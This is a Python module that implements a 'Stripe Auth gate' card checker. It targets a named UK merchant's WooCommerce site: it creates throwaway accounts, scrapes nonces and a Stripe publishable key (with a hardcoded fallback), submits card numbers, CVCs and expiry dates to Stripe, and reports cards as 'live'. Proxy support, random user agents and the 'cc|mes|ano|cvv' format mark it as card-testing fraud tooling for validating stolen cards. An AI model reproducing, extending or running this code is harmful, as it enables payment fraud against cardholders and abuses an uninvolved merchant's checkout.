"""Library module — Stripe Auth gate engine.

Provides ``process_stripe_card`` and ``check_card`` used by ``stripe.py``.
No standalone-bot scaffolding or CLI code here.
"""
import asyncio
import re
import json
import random
import aiohttp
from datetime import datetime
import uuid
from fake_useragent import UserAgent


def _gets(s, start, end):
    try:
        i = s.index(start) + len(start)
        return s[i: s.index(end, i)]
    except (ValueError, AttributeError):
        return None


def _random_email():
    import string
    user = "".join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    return f"{user}{random.randint(100, 9999)}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])}"


def _guid():
    return str(uuid.uuid4())


async def process_stripe_card(card_data: dict, proxy_url: str | None = None) -> tuple[bool, str]:
    """Hit the Stripe Auth gate and return (is_approved, message)."""
    ua = UserAgent()
    site_url = "https://www.eastlondonprintmakers.co.uk/my-account/add-payment-method/"
    try:
        from urllib.parse import urlparse
        parsed = urlparse(site_url)
        domain = f"{parsed.scheme}://{parsed.netloc}"
        email = _random_email()
        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "user-agent": ua.random,
            }
            resp = await session.get(site_url, headers=headers, proxy=proxy_url)
            resp_text = await resp.text()

            register_nonce = (
                _gets(resp_text, 'woocommerce-register-nonce" value="', '"')
                or _gets(resp_text, 'id="woocommerce-register-nonce" value="', '"')
                or _gets(resp_text, 'name="woocommerce-register-nonce" value="', '"')
            )
            if register_nonce:
                username = email.split("@")[0]
                password = f"Pass{random.randint(100000, 999999)}!"
                reg_data = {
                    "email": email,
                    "wc_order_attribution_source_type": "typein",
                    "wc_order_attribution_referrer": "(none)",
                    "wc_order_attribution_utm_campaign": "(none)",
                    "wc_order_attribution_utm_source": "(direct)",
                    "wc_order_attribution_utm_medium": "(none)",
                    "wc_order_attribution_utm_content": "(none)",
                    "wc_order_attribution_utm_id": "(none)",
                    "wc_order_attribution_utm_term": "(none)",
                    "wc_order_attribution_utm_source_platform": "(none)",
                    "wc_order_attribution_utm_creative_format": "(none)",
                    "wc_order_attribution_utm_marketing_tactic": "(none)",
                    "wc_order_attribution_session_entry": site_url,
                    "wc_order_attribution_session_start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "wc_order_attribution_session_pages": "1",
                    "wc_order_attribution_session_count": "1",
                    "wc_order_attribution_user_agent": headers["user-agent"],
                    "woocommerce-register-nonce": register_nonce,
                    "_wp_http_referer": "/my-account/",
                    "register": "Register",
                }
                reg_resp = await session.post(site_url, headers=headers, data=reg_data, proxy=proxy_url)
                reg_text = await reg_resp.text()
                if "customer-logout" not in reg_text and "dashboard" not in reg_text.lower():
                    resp = await session.get(site_url, headers=headers, proxy=proxy_url)
                    resp_text = await resp.text()
                    login_nonce = _gets(resp_text, 'woocommerce-login-nonce" value="', '"')
                    if login_nonce:
                        await session.post(
                            site_url, headers=headers, proxy=proxy_url,
                            data={"username": username, "password": password,
                                  "woocommerce-login-nonce": login_nonce, "login": "Log in"},
                        )

            add_payment_url = f"{domain}/my-account/add-payment-method/"
            headers = {"user-agent": ua.random}
            resp = await session.get(add_payment_url, headers=headers, proxy=proxy_url)
            payment_text = await resp.text()

            add_card_nonce = (
                _gets(payment_text, 'createAndConfirmSetupIntentNonce":"', '"')
                or _gets(payment_text, 'add_card_nonce":"', '"')
                or _gets(payment_text, 'name="add_payment_method_nonce" value="', '"')
                or _gets(payment_text, 'wc_stripe_add_payment_method_nonce":"', '"')
            )
            stripe_key = (
                _gets(payment_text, '"key":"pk_', '"')
                or _gets(payment_text, 'data-key="pk_', '"')
                or _gets(payment_text, 'stripe_key":"pk_', '"')
                or _gets(payment_text, 'publishable_key":"pk_', '"')
            )
            if not stripe_key:
                m = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_text)
                if m:
                    stripe_key = m.group(0)
            if not stripe_key:
                stripe_key = "pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv"
            elif not stripe_key.startswith("pk_"):
                stripe_key = "pk_" + stripe_key

            stripe_headers = {
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "user-agent": ua.random,
            }
            stripe_data = {
                "type": "card",
                "card[number]": card_data["number"],
                "card[cvc]": card_data["cvc"],
                "card[exp_month]": card_data["exp_month"],
                "card[exp_year]": card_data["exp_year"],
                "allow_redisplay": "unspecified",
                "billing_details[address][country]": "AU",
                "payment_user_agent": "stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent",
                "referrer": domain,
                "client_attribution_metadata[client_session_id]": _guid(),
                "client_attribution_metadata[merchant_integration_source]": "elements",
                "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
                "client_attribution_metadata[merchant_integration_version]": "2021",
                "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
                "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
                "client_attribution_metadata[elements_session_config_id]": _guid(),
                "guid": _guid(),
                "muid": _guid(),
                "sid": _guid(),
                "key": stripe_key,
                "_stripe_version": "2024-06-20",
            }
            pm_resp = await session.post(
                "https://api.stripe.com/v1/payment_methods",
                headers=stripe_headers, data=stripe_data, proxy=proxy_url,
            )
            pm_json = await pm_resp.json()
            if "error" in pm_json:
                return False, pm_json["error"]["message"]
            pm_id = pm_json.get("id")
            if not pm_id:
                return False, "Failed to create Payment Method"

            confirm_headers = {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": domain,
                "x-requested-with": "XMLHttpRequest",
                "user-agent": ua.random,
            }
            endpoints = [
                {"url": f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
                 "data": {"wc-stripe-payment-method": pm_id}},
                {"url": f"{domain}/wp-admin/admin-ajax.php",
                 "data": {"action": "wc_stripe_create_and_confirm_setup_intent", "wc-stripe-payment-method": pm_id}},
                {"url": f"{domain}/?wc-ajax=add_payment_method",
                 "data": {"wc-stripe-payment-method": pm_id, "payment_method": "stripe"}},
            ]
            for endp in endpoints:
                if not add_card_nonce:
                    continue
                if "add_payment_method" in endp["url"]:
                    endp["data"]["woocommerce-add-payment-method-nonce"] = add_card_nonce
                else:
                    endp["data"]["_ajax_nonce"] = add_card_nonce
                endp["data"]["wc-stripe-payment-type"] = "card"
                try:
                    res = await session.post(endp["url"], data=endp["data"],
                                             headers=confirm_headers, proxy=proxy_url)
                    text = await res.text()
                    if "success" in text:
                        js = json.loads(text)
                        if js.get("success"):
                            status = js.get("data", {}).get("status", "")
                            return True, f"Approved (Status: {status})"
                        else:
                            msg = js.get("data", {}).get("error", {}).get("message", "Declined")
                            return False, msg
                except Exception:
                    continue
            return False, "Confirmation failed on site"
    except Exception as e:
        return False, f"System Error: {str(e)}"


async def check_card(cc: str, mes: str, ano: str, cvv: str, proxy: str | None = None) -> dict:
    """Convenience wrapper — returns dict with ``is_live`` and ``response``."""
    card_data = {"number": cc, "exp_month": mes, "exp_year": ano, "cvc": cvv}
    is_approved, response_msg = await process_stripe_card(card_data, proxy_url=proxy)
    lower = response_msg.lower()
    is_live = is_approved or "requires_action" in lower or "succeeded" in lower
    return {
        "cc": f"{cc}|{mes}|{ano}|{cvv}",
        "is_live": is_live,
        "response": response_msg,
    }
